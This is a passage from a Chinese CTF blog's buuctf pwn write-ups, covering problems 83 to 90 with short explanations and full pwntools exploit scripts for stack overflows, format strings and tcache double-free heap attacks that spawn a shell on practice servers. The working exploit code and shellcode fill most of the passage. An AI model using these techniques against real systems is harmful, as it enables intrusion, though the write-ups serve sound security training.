<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bufptr = <span class="number">0x602120</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x10</span>) + p64(<span class="number">0x81</span>)</span><br><span class="line">payload += p64(bufptr + <span class="number">8</span> - <span class="number">0x18</span>) + p64(bufptr + <span class="number">8</span> - <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x0</span>, <span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x91</span>) + payload.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;a&#x27;</span>) + p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) + p64(bufptr) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Content is &#x27;</span>)</span><br><span class="line">atoi = u64(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;atoi = &quot;</span> + <span class="built_in">hex</span>(atoi))</span><br><span class="line">base = atoi - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc base = &quot;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">__free_hook = base + libc.symbols[<span class="string">b&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">1</span>, p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) + p64(bufptr) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">1</span>, p64(system) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;option---&gt;&gt;\n&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/04/buuctf-pwn-write-ups-11/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/04/buuctf-pwn-write-ups-11/" class="post-title-link" itemprop="url">buuctf-pwn write-ups(11)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-04 11:06:14" itemprop="dateCreated datePublished" datetime="2023-03-04T11:06:14+08:00">2023-03-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-06 17:19:19" itemprop="dateModified" datetime="2023-03-06T17:19:19+08:00">2023-03-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>9.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="buu083-x_ctf_b0verfl0w"><a class="markdownIt-Anchor" href="#buu083-x_ctf_b0verfl0w"></a> buu083-x_ctf_b0verfl0w</h1>
<p>这道题一共可写50字节，其中可以覆盖返回地址，又有sub esp, 24h和jmp esp这样的gadget，可以直接在栈上写shellcode，但是对于50字节的利用比较紧凑，需要对shellcraft的汇编代码稍作修改。</p>
<p>其中将开头3个push改为2个，同时省去避免输入空字符所做的绕过，可以节省几个字节空间。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./b0verfl0w&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27901</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./b0verfl0w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell = <span class="string">&#x27;\</span></span><br><span class="line"><span class="string">	push 0x68732f;\</span></span><br><span class="line"><span class="string">	push 0x6e69622f;\</span></span><br><span class="line"><span class="string">	mov ebx, esp;\</span></span><br><span class="line"><span class="string">	push 0x6873;\</span></span><br><span class="line"><span class="string">	xor ecx, ecx;\</span></span><br><span class="line"><span class="string">	push ecx;\</span></span><br><span class="line"><span class="string">	push 4;\</span></span><br><span class="line"><span class="string">	pop ecx;\</span></span><br><span class="line"><span class="string">	add ecx, esp;\</span></span><br><span class="line"><span class="string">	push ecx;\</span></span><br><span class="line"><span class="string">	mov ecx, esp;\</span></span><br><span class="line"><span class="string">	xor edx, edx;\</span></span><br><span class="line"><span class="string">	jmp .1;\</span></span><br><span class="line"><span class="string">	pop eax;\</span></span><br><span class="line"><span class="string">	pop eax;\</span></span><br><span class="line"><span class="string">	pop eax;\</span></span><br><span class="line"><span class="string">	pop eax;\</span></span><br><span class="line"><span class="string">	.1:\</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line">shell2 = <span class="string">&#x27;\</span></span><br><span class="line"><span class="string">	push 11;\</span></span><br><span class="line"><span class="string">	pop eax;\</span></span><br><span class="line"><span class="string">	int 0x80;\</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shell)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;name?\n&#x27;</span>, (p32(<span class="number">0x8048504</span>) + shellcode[:<span class="number">0x20</span>] + p32(<span class="number">0x80484fd</span>) + asm(shell2)).ljust(<span class="number">50</span>, <span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu084-picoctf_2018_leak_me"><a class="markdownIt-Anchor" href="#buu084-picoctf_2018_leak_me"></a> buu084-picoctf_2018_leak_me</h1>
<p>这道题利用strcat函数即可泄露口令。虽然每一次生成靶机的时候口令都不一样，但方便的做法就是先泄露一次然后再跑一次直接输口令。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./PicoCTF_2018_leak-me&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28532</span>)</span><br><span class="line"></span><br><span class="line">password = <span class="string">b&#x27;a_reAllY_s3cuRe_p4s$word_f85406&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;name?\n&#x27;</span>, cyclic(<span class="number">256</span>))</span><br><span class="line"></span><br><span class="line">io.sendline(password)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu085-inndy_echo"><a class="markdownIt-Anchor" href="#buu085-inndy_echo"></a> buu085-inndy_echo</h1>
<p>格式化字符串漏洞。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./echo&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28212</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./echo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;%8$s&#x27;</span> + p32(elf.got[<span class="string">&#x27;fgets&#x27;</span>]))</span><br><span class="line">fgets = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;fgets&#x27;</span>, fgets)</span><br><span class="line">base = fgets - libc.dump(<span class="string">&#x27;fgets&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]: system&#125;)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu086-hitcontraining_unlink"><a class="markdownIt-Anchor" href="#buu086-hitcontraining_unlink"></a> buu086-hitcontraining_unlink</h1>
<p>同第73题。</p>
<h1 id="buu087-ciscn_2019_final_3"><a class="markdownIt-Anchor" href="#buu087-ciscn_2019_final_3"></a> buu087-ciscn_2019_final_3</h1>
<p>从表面上来看，这是一道C++ pwn，但实际上就是一个普通的堆题。</p>
<p>只提供了2个选项：添加chunk和删除chunk，其中删除可以有double free，分配chunk只能分配0x78以内大小的chunk。每一次分配结束之后会返回堆地址。虽然本题我们获得了堆地址，但是程序和libc的加载地址都未知，而且看上去无法读取内存内容。</p>
<p>因此我们就必须考虑另辟蹊径。</p>
<p>思考一下，如果我们能够将chunk分配到main_arena中或者是__free_hook，那么分配之后的输出就能够让我们成功获取libc的地址。因此总的思路是：想尽办法将chunk分配到main_arena，获取libc地址后再想办法分配chunk到__free_hook。本题的libc版本为2.27-3ubuntu1，笔者的libc版本为2.27-3ubuntu1.6，这两个版本对于tcache的free操作不同，前者没有对于tcache的double free检查，而后者有，因此必须加上环境变量LD_PRELOAD选项。但即便如此，也只能勉强做题，因为没有dbg-symbols，我们无法在gdb中使用heap、bin等查看堆内容的关键性命令，这会使得做题变得很难受。不过由于这道题的出题时间比较早，出现这种情况也是完全可以理解的，做最近比赛的题目一般就不会有这种蛋疼的情况。</p>
<p>说回到本题上。本题利用仅有的一个输出机会的方式如下图所示：<br />
<img src="1.png" alt="" /></p>
<p>注：图中浅色chunk比深色chunk的大小小。</p>
<p>由于2.27-3ubuntu1版本中没有对tcache chunk的double free检测，我们甚至可以连续两次释放同一个chunk。释放后，首先分配一次出去，将fd指针修改到该chunk前面0x10字节，然后再一次分配，这一次分配就可以修改到这个chunk的大小，将其改成unsorted bin的范围，这样在free这个chunk之后，堆中就会出现2个相同的指向main_arena+96的地址。然后我们通过继续分配让这个chunk被切割，这里要注意一个细节，就是切割后main_arena+96的保存地址会修改，我们让这个地址被修改到下一个chunk的fd部分，再提前将这个chunk释放掉，这样tcache中就会链入main_arena+96的地址。如此操作之后，我们就能够向main_arena+96分配chunk。</p>
<p>这里还要注意一个细节，我们要将第2个chunk的大小设置得与其他的chunk不同，可以假设一下，如果实现分配的所有chunk大小都相同，那么释放的顺序应该是2、1、1，这样第1个chunk才能在后面的malloc中优先被分配。在malloc两次之后，第1个chunk的大小被成功修改，此时tcache中还有1个chunk，那就是chunk 2，此时若想要切割unsorted bin chunk，就必须首先分配第2个chunk，此时tcache为空，即使此时chunk 2中的fd被修改为了main_arena+96，我们也无法在这个地方分配chunk了，因为它已经无法被链入到tcache链表，只有当chunk 2在释放状态时修改fd指针才行。</p>
<p>有了libc的基地址之后，我们就可以如法炮制，通过double free将chunk轻松地分配到__free_hook，然后一次释放即可get shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process([&#x27;./ciscn_final_3&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28938</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">heap_addr = [<span class="number">0</span>] * <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;choice &gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;input the index\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	sla(<span class="string">b&#x27;input the size\n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	sa(<span class="string">b&#x27;now you can write something\n&#x27;</span>, content)</span><br><span class="line">	io.recvuntil(<span class="string">b&#x27;gift :0x&#x27;</span>)</span><br><span class="line">	heap_addr[index] = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">b&#x27;choice &gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">b&#x27;input the index\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x70</span>, <span class="string">b&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x60</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x60</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x60</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x70</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x70</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x70</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x10</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x70</span>, p64(heap_addr[<span class="number">0</span>] - <span class="number">0x10</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x70</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x70</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0x421</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x70</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x40</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>)	<span class="comment"># to main_arena + 96</span></span><br><span class="line">__malloc_hook = heap_addr[<span class="number">15</span>] - <span class="number">0x70</span></span><br><span class="line">base = __malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc base = &#x27;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line">__free_hook = base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;__free_hook = &#x27;</span> + <span class="built_in">hex</span>(__free_hook))</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">16</span>, <span class="number">0x60</span>, p64(__free_hook) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">17</span>, <span class="number">0x60</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">18</span>, <span class="number">0x60</span>, p64(system) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu088-axb_2019_fmt64"><a class="markdownIt-Anchor" href="#buu088-axb_2019_fmt64"></a> buu088-axb_2019_fmt64</h1>
<p>和第85题神相似。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./axb_2019_fmt64&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26942</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./axb_2019_fmt64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>, <span class="string">b&#x27;%9$s\x00\x00\x00\x00&#x27;</span> + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Repeater:&#x27;</span>)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">8</span>, &#123;elf.got[<span class="string">&#x27;strlen&#x27;</span>]: system&#125;, numbwritten=<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;b *0x4008d0&#x27;)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;||/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu089-wustctf2020_name_your_cat"><a class="markdownIt-Anchor" href="#buu089-wustctf2020_name_your_cat"></a> buu089-wustctf2020_name_your_cat</h1>
<p>直接溢出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./wustctf2020_name_your_cat&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29532</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./wustctf2020_name_your_cat&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Name for which?\n&gt;&#x27;</span>, <span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Give your name plz: &#x27;</span>, p32(elf.symbols[<span class="string">&#x27;shell&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Name for which?\n&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Give your name plz: &#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu090-pwnme1"><a class="markdownIt-Anchor" href="#buu090-pwnme1"></a> buu090-pwnme1</h1>
<p>scanf直接溢出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwnme1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29037</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwnme1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&gt; 6. Exit    \n&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xA4</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0x8048898</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;getfruit&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input the name of fruit:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;...\n&#x27;</span>)</span><br><span class="line">puts = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xA4</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(<span 